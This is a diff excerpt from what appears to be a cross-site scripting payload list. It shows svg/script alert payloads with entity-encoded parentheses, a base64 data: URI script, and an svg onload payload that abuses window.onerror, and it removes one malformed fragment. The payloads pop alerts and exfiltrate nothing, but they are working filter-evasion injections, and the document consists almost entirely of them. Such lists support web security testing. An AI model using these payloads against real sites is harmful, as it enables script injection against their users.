@@ -25,8 +25,6 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert(
 
 <svg><x><script>alert&#40;7&#41</x>
 
-"xxxxxxxx'yyyyy</img 
-
 <svg><x><script>alert&#40;1&#41</x>
 <svg><x><script>alert&#40;&#39;1&#39;&#41</x>
 <svg onload=window.onerror=alert;throw/1/;//"/>
